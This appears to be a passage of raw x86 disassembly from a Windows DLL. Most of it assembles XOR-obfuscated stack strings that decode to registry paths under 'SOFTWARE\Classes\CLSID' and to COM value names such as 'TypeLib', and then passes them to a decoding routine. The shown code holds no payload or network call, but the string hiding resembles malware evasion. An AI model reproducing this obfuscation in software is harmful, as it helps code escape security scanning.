100055de:	c6 85 a1 fe ff ff 48 	movb   $0x48,-0x15f(%ebp)
100055e5:	c6 85 a2 fe ff ff 4e 	movb   $0x4e,-0x15e(%ebp)
100055ec:	c6 85 a3 fe ff ff 3a 	movb   $0x3a,-0x15d(%ebp)
100055f3:	c6 85 a4 fe ff ff 52 	movb   $0x52,-0x15c(%ebp)
100055fa:	c6 85 a5 fe ff ff 3c 	movb   $0x3c,-0x15b(%ebp)
10005601:	c6 85 a6 fe ff ff 3e 	movb   $0x3e,-0x15a(%ebp)
10005608:	c6 85 a7 fe ff ff 47 	movb   $0x47,-0x159(%ebp)
1000560f:	c6 85 a8 fe ff ff 3b 	movb   $0x3b,-0x158(%ebp)
10005616:	c6 85 a9 fe ff ff 52 	movb   $0x52,-0x157(%ebp)
1000561d:	c6 85 aa fe ff ff 4e 	movb   $0x4e,-0x156(%ebp)
10005624:	c6 85 ab fe ff ff 4e 	movb   $0x4e,-0x155(%ebp)
1000562b:	c6 85 ac fe ff ff 3b 	movb   $0x3b,-0x154(%ebp)
10005632:	c6 85 ad fe ff ff 4d 	movb   $0x4d,-0x153(%ebp)
10005639:	c6 85 ae fe ff ff 52 	movb   $0x52,-0x152(%ebp)
10005640:	c6 85 af fe ff ff 3e 	movb   $0x3e,-0x151(%ebp)
10005647:	c6 85 b0 fe ff ff 3c 	movb   $0x3c,-0x150(%ebp)
1000564e:	c6 85 b1 fe ff ff 49 	movb   $0x49,-0x14f(%ebp)
10005655:	c6 85 b2 fe ff ff 3a 	movb   $0x3a,-0x14e(%ebp)
1000565c:	c6 85 b3 fe ff ff 52 	movb   $0x52,-0x14d(%ebp)
10005663:	c6 85 b4 fe ff ff 49 	movb   $0x49,-0x14c(%ebp)
1000566a:	c6 85 b5 fe ff ff 46 	movb   $0x46,-0x14b(%ebp)
10005671:	c6 85 b6 fe ff ff 3e 	movb   $0x3e,-0x14a(%ebp)
10005678:	c6 85 b7 fe ff ff 39 	movb   $0x39,-0x149(%ebp)
1000567f:	c6 85 b8 fe ff ff 49 	movb   $0x49,-0x148(%ebp)
10005686:	c6 85 b9 fe ff ff 4d 	movb   $0x4d,-0x147(%ebp)
1000568d:	c6 85 ba fe ff ff 46 	movb   $0x46,-0x146(%ebp)
10005694:	c6 85 bb fe ff ff 46 	movb   $0x46,-0x145(%ebp)
1000569b:	c6 85 bc fe ff ff 46 	movb   $0x46,-0x144(%ebp)
100056a2:	c6 85 bd fe ff ff 4d 	movb   $0x4d,-0x143(%ebp)
100056a9:	c6 85 be fe ff ff 4e 	movb   $0x4e,-0x142(%ebp)
100056b0:	c6 85 bf fe ff ff 3a 	movb   $0x3a,-0x141(%ebp)
100056b7:	c6 85 c0 fe ff ff 02 	movb   $0x2,-0x140(%ebp)
100056be:	88 9d c1 fe ff ff    	mov    %bl,-0x13f(%ebp)
100056c4:	c6 85 44 fe ff ff 2c 	movb   $0x2c,-0x1bc(%ebp)
100056cb:	c6 85 45 fe ff ff 30 	movb   $0x30,-0x1bb(%ebp)
100056d2:	c6 85 46 fe ff ff 39 	movb   $0x39,-0x1ba(%ebp)
100056d9:	c6 85 47 fe ff ff 2b 	movb   $0x2b,-0x1b9(%ebp)
100056e0:	c6 85 48 fe ff ff 28 	movb   $0x28,-0x1b8(%ebp)
100056e7:	c6 85 49 fe ff ff 3e 	movb   $0x3e,-0x1b7(%ebp)
100056ee:	c6 85 4a fe ff ff 2d 	movb   $0x2d,-0x1b6(%ebp)
100056f5:	c6 85 4b fe ff ff 3a 	movb   $0x3a,-0x1b5(%ebp)
100056fc:	c6 85 4c fe ff ff 23 	movb   $0x23,-0x1b4(%ebp)
10005703:	c6 85 4d fe ff ff 3c 	movb   $0x3c,-0x1b3(%ebp)
1000570a:	c6 85 4e fe ff ff 13 	movb   $0x13,-0x1b2(%ebp)
10005711:	c6 85 4f fe ff ff 1e 	movb   $0x1e,-0x1b1(%ebp)
10005718:	c6 85 50 fe ff ff 0c 	movb   $0xc,-0x1b0(%ebp)
1000571f:	c6 85 51 fe ff ff 0c 	movb   $0xc,-0x1af(%ebp)
10005726:	c6 85 52 fe ff ff 1a 	movb   $0x1a,-0x1ae(%ebp)
1000572d:	c6 85 53 fe ff ff 0c 	movb   $0xc,-0x1ad(%ebp)
10005734:	c6 85 54 fe ff ff 23 	movb   $0x23,-0x1ac(%ebp)
1000573b:	c6 85 55 fe ff ff 3c 	movb   $0x3c,-0x1ab(%ebp)
10005742:	c6 85 56 fe ff ff 33 	movb   $0x33,-0x1aa(%ebp)
10005749:	c6 85 57 fe ff ff 2c 	movb   $0x2c,-0x1a9(%ebp)
10005750:	c6 85 58 fe ff ff 36 	movb   $0x36,-0x1a8(%ebp)
10005757:	c6 85 59 fe ff ff 3b 	movb   $0x3b,-0x1a7(%ebp)
1000575e:	c6 85 5a fe ff ff 23 	movb   $0x23,-0x1a6(%ebp)
10005765:	c6 85 5b fe ff ff 04 	movb   $0x4,-0x1a5(%ebp)
1000576c:	c6 85 5c fe ff ff 3a 	movb   $0x3a,-0x1a4(%ebp)
10005773:	c6 85 5d fe ff ff 4f 	movb   $0x4f,-0x1a3(%ebp)
1000577a:	c6 85 5e fe ff ff 47 	movb   $0x47,-0x1a2(%ebp)
10005781:	c6 85 5f fe ff ff 4e 	movb   $0x4e,-0x1a1(%ebp)
10005788:	c6 85 60 fe ff ff 3e 	movb   $0x3e,-0x1a0(%ebp)
1000578f:	c6 85 61 fe ff ff 3c 	movb   $0x3c,-0x19f(%ebp)
10005796:	c6 85 62 fe ff ff 3d 	movb   $0x3d,-0x19e(%ebp)
1000579d:	c6 85 63 fe ff ff 46 	movb   $0x46,-0x19d(%ebp)
100057a4:	c6 85 64 fe ff ff 52 	movb   $0x52,-0x19c(%ebp)
100057ab:	c6 85 65 fe ff ff 4d 	movb   $0x4d,-0x19b(%ebp)
100057b2:	c6 85 66 fe ff ff 4d 	movb   $0x4d,-0x19a(%ebp)
100057b9:	c6 85 67 fe ff ff 46 	movb   $0x46,-0x199(%ebp)
100057c0:	c6 85 68 fe ff ff 46 	movb   $0x46,-0x198(%ebp)
100057c7:	c6 85 69 fe ff ff 52 	movb   $0x52,-0x197(%ebp)
100057ce:	c6 85 6a fe ff ff 4b 	movb   $0x4b,-0x196(%ebp)
100057d5:	c6 85 6b fe ff ff 4d 	movb   $0x4d,-0x195(%ebp)
100057dc:	c6 85 6c fe ff ff 4f 	movb   $0x4f,-0x194(%ebp)
100057e3:	c6 85 6d fe ff ff 3a 	movb   $0x3a,-0x193(%ebp)
100057ea:	c6 85 6e fe ff ff 52 	movb   $0x52,-0x192(%ebp)
100057f1:	c6 85 6f fe ff ff 46 	movb   $0x46,-0x191(%ebp)
100057f8:	c6 85 70 fe ff ff 48 	movb   $0x48,-0x190(%ebp)
100057ff:	c6 85 71 fe ff ff 3a 	movb   $0x3a,-0x18f(%ebp)
10005806:	c6 85 72 fe ff ff 4b 	movb   $0x4b,-0x18e(%ebp)
1000580d:	c6 85 73 fe ff ff 52 	movb   $0x52,-0x18d(%ebp)
10005814:	c6 85 74 fe ff ff 3d 	movb   $0x3d,-0x18c(%ebp)
1000581b:	c6 85 75 fe ff ff 3e 	movb   $0x3e,-0x18b(%ebp)
10005822:	c6 85 76 fe ff ff 4f 	movb   $0x4f,-0x18a(%ebp)
10005829:	c6 85 77 fe ff ff 4c 	movb   $0x4c,-0x189(%ebp)
10005830:	c6 85 78 fe ff ff 4a 	movb   $0x4a,-0x188(%ebp)
10005837:	c6 85 79 fe ff ff 4e 	movb   $0x4e,-0x187(%ebp)
1000583e:	c6 85 7a fe ff ff 47 	movb   $0x47,-0x186(%ebp)
10005845:	c6 85 7b fe ff ff 39 	movb   $0x39,-0x185(%ebp)
1000584c:	c6 85 7c fe ff ff 4a 	movb   $0x4a,-0x184(%ebp)
10005853:	c6 85 7d fe ff ff 3d 	movb   $0x3d,-0x183(%ebp)
1000585a:	c6 85 7e fe ff ff 49 	movb   $0x49,-0x182(%ebp)
10005861:	c6 85 7f fe ff ff 47 	movb   $0x47,-0x181(%ebp)
10005868:	c6 85 80 fe ff ff 02 	movb   $0x2,-0x180(%ebp)
1000586f:	88 9d 81 fe ff ff    	mov    %bl,-0x17f(%ebp)
10005875:	c6 85 04 fe ff ff 2c 	movb   $0x2c,-0x1fc(%ebp)
1000587c:	c6 85 05 fe ff ff 30 	movb   $0x30,-0x1fb(%ebp)
10005883:	c6 85 06 fe ff ff 39 	movb   $0x39,-0x1fa(%ebp)
1000588a:	c6 85 07 fe ff ff 2b 	movb   $0x2b,-0x1f9(%ebp)
10005891:	c6 85 08 fe ff ff 28 	movb   $0x28,-0x1f8(%ebp)
10005898:	c6 85 09 fe ff ff 3e 	movb   $0x3e,-0x1f7(%ebp)
1000589f:	c6 85 0a fe ff ff 2d 	movb   $0x2d,-0x1f6(%ebp)
100058a6:	c6 85 0b fe ff ff 3a 	movb   $0x3a,-0x1f5(%ebp)
100058ad:	c6 85 0c fe ff ff 23 	movb   $0x23,-0x1f4(%ebp)
100058b4:	c6 85 0d fe ff ff 3c 	movb   $0x3c,-0x1f3(%ebp)
100058bb:	c6 85 0e fe ff ff 13 	movb   $0x13,-0x1f2(%ebp)
100058c2:	c6 85 0f fe ff ff 1e 	movb   $0x1e,-0x1f1(%ebp)
100058c9:	c6 85 10 fe ff ff 0c 	movb   $0xc,-0x1f0(%ebp)
100058d0:	c6 85 11 fe ff ff 0c 	movb   $0xc,-0x1ef(%ebp)
100058d7:	c6 85 12 fe ff ff 1a 	movb   $0x1a,-0x1ee(%ebp)
100058de:	c6 85 13 fe ff ff 0c 	movb   $0xc,-0x1ed(%ebp)
100058e5:	c6 85 14 fe ff ff 23 	movb   $0x23,-0x1ec(%ebp)
100058ec:	c6 85 15 fe ff ff 3c 	movb   $0x3c,-0x1eb(%ebp)
100058f3:	c6 85 16 fe ff ff 33 	movb   $0x33,-0x1ea(%ebp)
100058fa:	c6 85 17 fe ff ff 2c 	movb   $0x2c,-0x1e9(%ebp)
10005901:	c6 85 18 fe ff ff 36 	movb   $0x36,-0x1e8(%ebp)
10005908:	c6 85 19 fe ff ff 3b 	movb   $0x3b,-0x1e7(%ebp)
1000590f:	c6 85 1a fe ff ff 23 	movb   $0x23,-0x1e6(%ebp)
10005916:	c6 85 1b fe ff ff 04 	movb   $0x4,-0x1e5(%ebp)
1000591d:	c6 85 1c fe ff ff 49 	movb   $0x49,-0x1e4(%ebp)
10005924:	c6 85 1d fe ff ff 3e 	movb   $0x3e,-0x1e3(%ebp)
1000592b:	c6 85 1e fe ff ff 46 	movb   $0x46,-0x1e2(%ebp)
10005932:	c6 85 1f fe ff ff 4e 	movb   $0x4e,-0x1e1(%ebp)
10005939:	c6 85 20 fe ff ff 48 	movb   $0x48,-0x1e0(%ebp)
10005940:	c6 85 21 fe ff ff 4d 	movb   $0x4d,-0x1df(%ebp)
10005947:	c6 85 22 fe ff ff 4d 	movb   $0x4d,-0x1de(%ebp)
1000594e:	c6 85 23 fe ff ff 3d 	movb   $0x3d,-0x1dd(%ebp)
10005955:	c6 85 24 fe ff ff 52 	movb   $0x52,-0x1dc(%ebp)
1000595c:	c6 85 25 fe ff ff 4e 	movb   $0x4e,-0x1db(%ebp)
10005963:	c6 85 26 fe ff ff 3a 	movb   $0x3a,-0x1da(%ebp)
1000596a:	c6 85 27 fe ff ff 46 	movb   $0x46,-0x1d9(%ebp)
10005971:	c6 85 28 fe ff ff 4f 	movb   $0x4f,-0x1d8(%ebp)
10005978:	c6 85 29 fe ff ff 52 	movb   $0x52,-0x1d7(%ebp)
1000597f:	c6 85 2a fe ff ff 4b 	movb   $0x4b,-0x1d6(%ebp)
10005986:	c6 85 2b fe ff ff 49 	movb   $0x49,-0x1d5(%ebp)
1000598d:	c6 85 2c fe ff ff 46 	movb   $0x46,-0x1d4(%ebp)
10005994:	c6 85 2d fe ff ff 3b 	movb   $0x3b,-0x1d3(%ebp)
1000599b:	c6 85 2e fe ff ff 52 	movb   $0x52,-0x1d2(%ebp)
100059a2:	c6 85 2f fe ff ff 3d 	movb   $0x3d,-0x1d1(%ebp)
100059a9:	c6 85 30 fe ff ff 3a 	movb   $0x3a,-0x1d0(%ebp)
100059b0:	c6 85 31 fe ff ff 4c 	movb   $0x4c,-0x1cf(%ebp)
100059b7:	c6 85 32 fe ff ff 3c 	movb   $0x3c,-0x1ce(%ebp)
100059be:	c6 85 33 fe ff ff 52 	movb   $0x52,-0x1cd(%ebp)
100059c5:	c6 85 34 fe ff ff 4b 	movb   $0x4b,-0x1cc(%ebp)
100059cc:	c6 85 35 fe ff ff 4b 	movb   $0x4b,-0x1cb(%ebp)
100059d3:	c6 85 36 fe ff ff 3c 	movb   $0x3c,-0x1ca(%ebp)
100059da:	c6 85 37 fe ff ff 4d 	movb   $0x4d,-0x1c9(%ebp)
100059e1:	c6 85 38 fe ff ff 4e 	movb   $0x4e,-0x1c8(%ebp)
100059e8:	c6 85 39 fe ff ff 4c 	movb   $0x4c,-0x1c7(%ebp)
100059ef:	c6 85 3a fe ff ff 47 	movb   $0x47,-0x1c6(%ebp)
100059f6:	c6 85 3b fe ff ff 39 	movb   $0x39,-0x1c5(%ebp)
100059fd:	c6 85 3c fe ff ff 4d 	movb   $0x4d,-0x1c4(%ebp)
10005a04:	c6 85 3d fe ff ff 4a 	movb   $0x4a,-0x1c3(%ebp)
10005a0b:	c6 85 3e fe ff ff 48 	movb   $0x48,-0x1c2(%ebp)
10005a12:	c6 85 3f fe ff ff 48 	movb   $0x48,-0x1c1(%ebp)
10005a19:	c6 85 40 fe ff ff 02 	movb   $0x2,-0x1c0(%ebp)
10005a20:	88 9d 41 fe ff ff    	mov    %bl,-0x1bf(%ebp)
10005a26:	c6 85 98 fd ff ff 2c 	movb   $0x2c,-0x268(%ebp)
10005a2d:	c6 85 99 fd ff ff 30 	movb   $0x30,-0x267(%ebp)
10005a34:	c6 85 9a fd ff ff 39 	movb   $0x39,-0x266(%ebp)
10005a3b:	c6 85 9b fd ff ff 2b 	movb   $0x2b,-0x265(%ebp)
10005a42:	c6 85 9c fd ff ff 28 	movb   $0x28,-0x264(%ebp)
10005a49:	c6 85 9d fd ff ff 3e 	movb   $0x3e,-0x263(%ebp)
10005a50:	c6 85 9e fd ff ff 2d 	movb   $0x2d,-0x262(%ebp)
10005a57:	c6 85 9f fd ff ff 3a 	movb   $0x3a,-0x261(%ebp)
10005a5e:	c6 85 a0 fd ff ff 23 	movb   $0x23,-0x260(%ebp)
10005a65:	c6 85 a1 fd ff ff 3c 	movb   $0x3c,-0x25f(%ebp)
10005a6c:	c6 85 a2 fd ff ff 13 	movb   $0x13,-0x25e(%ebp)
10005a73:	c6 85 a3 fd ff ff 1e 	movb   $0x1e,-0x25d(%ebp)
10005a7a:	c6 85 a4 fd ff ff 0c 	movb   $0xc,-0x25c(%ebp)
10005a81:	c6 85 a5 fd ff ff 0c 	movb   $0xc,-0x25b(%ebp)
10005a88:	c6 85 a6 fd ff ff 1a 	movb   $0x1a,-0x25a(%ebp)
10005a8f:	c6 85 a7 fd ff ff 0c 	movb   $0xc,-0x259(%ebp)
10005a96:	c6 85 a8 fd ff ff 23 	movb   $0x23,-0x258(%ebp)
10005a9d:	c6 85 a9 fd ff ff 3c 	movb   $0x3c,-0x257(%ebp)
10005aa4:	c6 85 aa fd ff ff 33 	movb   $0x33,-0x256(%ebp)
10005aab:	c6 85 ab fd ff ff 2c 	movb   $0x2c,-0x255(%ebp)
10005ab2:	c6 85 ac fd ff ff 36 	movb   $0x36,-0x254(%ebp)
10005ab9:	c6 85 ad fd ff ff 3b 	movb   $0x3b,-0x253(%ebp)
10005ac0:	c6 85 ae fd ff ff 23 	movb   $0x23,-0x252(%ebp)
10005ac7:	c6 85 af fd ff ff 04 	movb   $0x4,-0x251(%ebp)
10005ace:	c6 85 b0 fd ff ff 3c 	movb   $0x3c,-0x250(%ebp)
10005ad5:	c6 85 b1 fd ff ff 4b 	movb   $0x4b,-0x24f(%ebp)
10005adc:	c6 85 b2 fd ff ff 4d 	movb   $0x4d,-0x24e(%ebp)
10005ae3:	c6 85 b3 fd ff ff 46 	movb   $0x46,-0x24d(%ebp)
10005aea:	c6 85 b4 fd ff ff 3c 	movb   $0x3c,-0x24c(%ebp)
10005af1:	c6 85 b5 fd ff ff 3c 	movb   $0x3c,-0x24b(%ebp)
10005af8:	c6 85 b6 fd ff ff 3a 	movb   $0x3a,-0x24a(%ebp)
10005aff:	c6 85 b7 fd ff ff 4b 	movb   $0x4b,-0x249(%ebp)
10005b06:	c6 85 b8 fd ff ff 52 	movb   $0x52,-0x248(%ebp)
10005b0d:	c6 85 b9 fd ff ff 46 	movb   $0x46,-0x247(%ebp)
10005b14:	c6 85 ba fd ff ff 4c 	movb   $0x4c,-0x246(%ebp)
10005b1b:	c6 85 bb fd ff ff 4e 	movb   $0x4e,-0x245(%ebp)
10005b22:	c6 85 bc fd ff ff 4f 	movb   $0x4f,-0x244(%ebp)
10005b29:	c6 85 bd fd ff ff 52 	movb   $0x52,-0x243(%ebp)
10005b30:	c6 85 be fd ff ff 4b 	movb   $0x4b,-0x242(%ebp)
10005b37:	c6 85 bf fd ff ff 3b 	movb   $0x3b,-0x241(%ebp)
10005b3e:	c6 85 c0 fd ff ff 48 	movb   $0x48,-0x240(%ebp)
10005b45:	c6 85 c1 fd ff ff 3c 	movb   $0x3c,-0x23f(%ebp)
10005b4c:	c6 85 c2 fd ff ff 52 	movb   $0x52,-0x23e(%ebp)
10005b53:	c6 85 c3 fd ff ff 3e 	movb   $0x3e,-0x23d(%ebp)
10005b5a:	c6 85 c4 fd ff ff 46 	movb   $0x46,-0x23c(%ebp)
10005b61:	c6 85 c5 fd ff ff 3d 	movb   $0x3d,-0x23b(%ebp)
10005b68:	c6 85 c6 fd ff ff 3d 	movb   $0x3d,-0x23a(%ebp)
10005b6f:	c6 85 c7 fd ff ff 52 	movb   $0x52,-0x239(%ebp)
10005b76:	c6 85 c8 fd ff ff 48 	movb   $0x48,-0x238(%ebp)
10005b7d:	c6 85 c9 fd ff ff 4d 	movb   $0x4d,-0x237(%ebp)
10005b84:	c6 85 ca fd ff ff 3a 	movb   $0x3a,-0x236(%ebp)
10005b8b:	c6 85 cb fd ff ff 4a 	movb   $0x4a,-0x235(%ebp)
10005b92:	c6 85 cc fd ff ff 3a 	movb   $0x3a,-0x234(%ebp)
10005b99:	c6 85 cd fd ff ff 3a 	movb   $0x3a,-0x233(%ebp)
10005ba0:	c6 85 ce fd ff ff 46 	movb   $0x46,-0x232(%ebp)
10005ba7:	c6 85 cf fd ff ff 46 	movb   $0x46,-0x231(%ebp)
10005bae:	c6 85 d0 fd ff ff 4a 	movb   $0x4a,-0x230(%ebp)
10005bb5:	c6 85 d1 fd ff ff 3e 	movb   $0x3e,-0x22f(%ebp)
10005bbc:	c6 85 d2 fd ff ff 4d 	movb   $0x4d,-0x22e(%ebp)
10005bc3:	c6 85 d3 fd ff ff 3d 	movb   $0x3d,-0x22d(%ebp)
10005bca:	c6 85 d4 fd ff ff 02 	movb   $0x2,-0x22c(%ebp)
10005bd1:	88 9d d5 fd ff ff    	mov    %bl,-0x22b(%ebp)
10005bd7:	c6 85 58 fd ff ff 2c 	movb   $0x2c,-0x2a8(%ebp)
10005bde:	c6 85 59 fd ff ff 30 	movb   $0x30,-0x2a7(%ebp)
10005be5:	c6 85 5a fd ff ff 39 	movb   $0x39,-0x2a6(%ebp)
10005bec:	c6 85 5b fd ff ff 2b 	movb   $0x2b,-0x2a5(%ebp)
10005bf3:	c6 85 5c fd ff ff 28 	movb   $0x28,-0x2a4(%ebp)
10005bfa:	c6 85 5d fd ff ff 3e 	movb   $0x3e,-0x2a3(%ebp)
10005c01:	c6 85 5e fd ff ff 2d 	movb   $0x2d,-0x2a2(%ebp)
10005c08:	c6 85 5f fd ff ff 3a 	movb   $0x3a,-0x2a1(%ebp)
10005c0f:	c6 85 60 fd ff ff 23 	movb   $0x23,-0x2a0(%ebp)
10005c16:	c6 85 61 fd ff ff 3c 	movb   $0x3c,-0x29f(%ebp)
10005c1d:	c6 85 62 fd ff ff 13 	movb   $0x13,-0x29e(%ebp)
10005c24:	c6 85 63 fd ff ff 1e 	movb   $0x1e,-0x29d(%ebp)
10005c2b:	c6 85 64 fd ff ff 0c 	movb   $0xc,-0x29c(%ebp)
10005c32:	c6 85 65 fd ff ff 0c 	movb   $0xc,-0x29b(%ebp)
10005c39:	c6 85 66 fd ff ff 1a 	movb   $0x1a,-0x29a(%ebp)
10005c40:	c6 85 67 fd ff ff 0c 	movb   $0xc,-0x299(%ebp)
10005c47:	c6 85 68 fd ff ff 23 	movb   $0x23,-0x298(%ebp)
10005c4e:	c6 85 69 fd ff ff 3c 	movb   $0x3c,-0x297(%ebp)
10005c55:	c6 85 6a fd ff ff 33 	movb   $0x33,-0x296(%ebp)
10005c5c:	c6 85 6b fd ff ff 2c 	movb   $0x2c,-0x295(%ebp)
10005c63:	c6 85 6c fd ff ff 36 	movb   $0x36,-0x294(%ebp)
10005c6a:	c6 85 6d fd ff ff 3b 	movb   $0x3b,-0x293(%ebp)
10005c71:	c6 85 6e fd ff ff 23 	movb   $0x23,-0x292(%ebp)
10005c78:	c6 85 6f fd ff ff 04 	movb   $0x4,-0x291(%ebp)
10005c7f:	c6 85 70 fd ff ff 3b 	movb   $0x3b,-0x290(%ebp)
10005c86:	c6 85 71 fd ff ff 3e 	movb   $0x3e,-0x28f(%ebp)
10005c8d:	c6 85 72 fd ff ff 4e 	movb   $0x4e,-0x28e(%ebp)
10005c94:	c6 85 73 fd ff ff 49 	movb   $0x49,-0x28d(%ebp)
10005c9b:	c6 85 74 fd ff ff 49 	movb   $0x49,-0x28c(%ebp)
10005ca2:	c6 85 75 fd ff ff 4b 	movb   $0x4b,-0x28b(%ebp)
10005ca9:	c6 85 76 fd ff ff 3b 	movb   $0x3b,-0x28a(%ebp)
10005cb0:	c6 85 77 fd ff ff 3b 	movb   $0x3b,-0x289(%ebp)
10005cb7:	c6 85 78 fd ff ff 52 	movb   $0x52,-0x288(%ebp)
10005cbe:	c6 85 79 fd ff ff 4a 	movb   $0x4a,-0x287(%ebp)
10005cc5:	c6 85 7a fd ff ff 4e 	movb   $0x4e,-0x286(%ebp)
10005ccc:	c6 85 7b fd ff ff 4e 	movb   $0x4e,-0x285(%ebp)
10005cd3:	c6 85 7c fd ff ff 39 	movb   $0x39,-0x284(%ebp)
10005cda:	c6 85 7d fd ff ff 52 	movb   $0x52,-0x283(%ebp)
10005ce1:	c6 85 7e fd ff ff 4e 	movb   $0x4e,-0x282(%ebp)
10005ce8:	c6 85 7f fd ff ff 4e 	movb   $0x4e,-0x281(%ebp)
10005cef:	c6 85 80 fd ff ff 3c 	movb   $0x3c,-0x280(%ebp)
10005cf6:	c6 85 81 fd ff ff 3a 	movb   $0x3a,-0x27f(%ebp)
10005cfd:	c6 85 82 fd ff ff 52 	movb   $0x52,-0x27e(%ebp)
10005d04:	c6 85 83 fd ff ff 3d 	movb   $0x3d,-0x27d(%ebp)
10005d0b:	c6 85 84 fd ff ff 4e 	movb   $0x4e,-0x27c(%ebp)
10005d12:	c6 85 85 fd ff ff 3c 	movb   $0x3c,-0x27b(%ebp)
10005d19:	c6 85 86 fd ff ff 4f 	movb   $0x4f,-0x27a(%ebp)
10005d20:	c6 85 87 fd ff ff 52 	movb   $0x52,-0x279(%ebp)
10005d27:	c6 85 88 fd ff ff 3e 	movb   $0x3e,-0x278(%ebp)
10005d2e:	c6 85 89 fd ff ff 3d 	movb   $0x3d,-0x277(%ebp)
10005d35:	c6 85 8a fd ff ff 47 	movb   $0x47,-0x276(%ebp)
10005d3c:	c6 85 8b fd ff ff 4b 	movb   $0x4b,-0x275(%ebp)
10005d43:	c6 85 8c fd ff ff 47 	movb   $0x47,-0x274(%ebp)
10005d4a:	c6 85 8d fd ff ff 3c 	movb   $0x3c,-0x273(%ebp)
10005d51:	c6 85 8e fd ff ff 4e 	movb   $0x4e,-0x272(%ebp)
10005d58:	c6 85 8f fd ff ff 3b 	movb   $0x3b,-0x271(%ebp)
10005d5f:	c6 85 90 fd ff ff 4f 	movb   $0x4f,-0x270(%ebp)
10005d66:	c6 85 91 fd ff ff 3c 	movb   $0x3c,-0x26f(%ebp)
10005d6d:	c6 85 92 fd ff ff 3c 	movb   $0x3c,-0x26e(%ebp)
10005d74:	c6 85 93 fd ff ff 4b 	movb   $0x4b,-0x26d(%ebp)
10005d7b:	c6 85 94 fd ff ff 02 	movb   $0x2,-0x26c(%ebp)
10005d82:	88 9d 95 fd ff ff    	mov    %bl,-0x26b(%ebp)
10005d88:	c6 85 50 ff ff ff 2b 	movb   $0x2b,-0xb0(%ebp)
10005d8f:	c6 85 51 ff ff ff 06 	movb   $0x6,-0xaf(%ebp)
10005d96:	c6 85 52 ff ff ff 0f 	movb   $0xf,-0xae(%ebp)
10005d9d:	c6 85 53 ff ff ff 1a 	movb   $0x1a,-0xad(%ebp)
10005da4:	c6 85 54 ff ff ff 33 	movb   $0x33,-0xac(%ebp)
10005dab:	c6 85 55 ff ff ff 16 	movb   $0x16,-0xab(%ebp)
10005db2:	c6 85 56 ff ff ff 1d 	movb   $0x1d,-0xaa(%ebp)
10005db9:	88 9d 57 ff ff ff    	mov    %bl,-0xa9(%ebp)
10005dbf:	c6 85 04 ff ff ff 29 	movb   $0x29,-0xfc(%ebp)
10005dc6:	c6 85 05 ff ff ff 1a 	movb   $0x1a,-0xfb(%ebp)
10005dcd:	c6 85 06 ff ff ff 0d 	movb   $0xd,-0xfa(%ebp)
10005dd4:	c6 85 07 ff ff ff 0c 	movb   $0xc,-0xf9(%ebp)
10005ddb:	c6 85 08 ff ff ff 16 	movb   $0x16,-0xf8(%ebp)
10005de2:	c6 85 09 ff ff ff 10 	movb   $0x10,-0xf7(%ebp)
10005de9:	c6 85 0a ff ff ff 11 	movb   $0x11,-0xf6(%ebp)
10005df0:	88 9d 0b ff ff ff    	mov    %bl,-0xf5(%ebp)
10005df6:	c6 45 dc 32          	movb   $0x32,-0x24(%ebp)
10005dfa:	c6 45 dd 16          	movb   $0x16,-0x23(%ebp)
10005dfe:	c6 45 de 0c          	movb   $0xc,-0x22(%ebp)
10005e02:	c6 45 df 1c          	movb   $0x1c,-0x21(%ebp)
10005e06:	c6 45 e0 2c          	movb   $0x2c,-0x20(%ebp)
10005e0a:	c6 45 e1 0b          	movb   $0xb,-0x1f(%ebp)
10005e0e:	c6 45 e2 1e          	movb   $0x1e,-0x1e(%ebp)
10005e12:	c6 45 e3 0b          	movb   $0xb,-0x1d(%ebp)
10005e16:	c6 45 e4 0a          	movb   $0xa,-0x1c(%ebp)
10005e1a:	c6 45 e5 0c          	movb   $0xc,-0x1b(%ebp)
10005e1e:	88 5d e6             	mov    %bl,-0x1a(%ebp)
10005e21:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10005e24:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
10005e2a:	50                   	push   %eax
10005e2b:	e8 be 17 00 00       	call   0x100075ee
10005e30:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
10005e36:	89 85 dc fd ff ff    	mov    %eax,-0x224(%ebp)
10005e3c:	8d 45 9c             	lea    -0x64(%ebp),%eax
10005e3f:	50                   	push   %eax
10005e40:	e8 a9 17 00 00       	call   0x100075ee
10005e45:	8d 45 9c             	lea    -0x64(%ebp),%eax
10005e48:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
10005e4e:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
10005e54:	50                   	push   %eax
10005e55:	e8 94 17 00 00       	call   0x100075ee
10005e5a:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
10005e60:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
10005e66:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
10005e6c:	50                   	push   %eax
10005e6d:	e8 7c 17 00 00       	call   0x100075ee
10005e72:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
10005e78:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
10005e7e:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
10005e84:	50                   	push   %eax
10005e85:	e8 64 17 00 00       	call   0x100075ee
10005e8a:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
10005e90:	89 85 ec fd ff ff    	mov    %eax,-0x214(%ebp)
10005e96:	8d 85 84 fe ff ff    	lea    -0x17c(%ebp),%eax
10005e9c:	50                   	push   %eax
10005e9d:	e8 4c 17 00 00       	call   0x100075ee
10005ea2:	8d 85 84 fe ff ff    	lea    -0x17c(%ebp),%eax
10005ea8:	89 85 f0 fd ff ff    	mov    %eax,-0x210(%ebp)
10005eae:	8d 85 44 fe ff ff    	lea    -0x1bc(%ebp),%eax
10005eb4:	50                   	push   %eax
10005eb5:	e8 34 17 00 00       	call   0x100075ee
10005eba:	8d 85 44 fe ff ff    	lea    -0x1bc(%ebp),%eax
10005ec0:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
10005ec6:	8d 85 04 fe ff ff    	lea    -0x1fc(%ebp),%eax
10005ecc:	50                   	push   %eax
10005ecd:	e8 1c 17 00 00       	call   0x100075ee
10005ed2:	8d 85 04 fe ff ff    	lea    -0x1fc(%ebp),%eax
10005ed8:	89 85 f8 fd ff ff    	mov    %eax,-0x208(%ebp)
10005ede:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
10005ee4:	50                   	push   %eax
10005ee5:	e8 04 17 00 00       	call   0x100075ee
10005eea:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
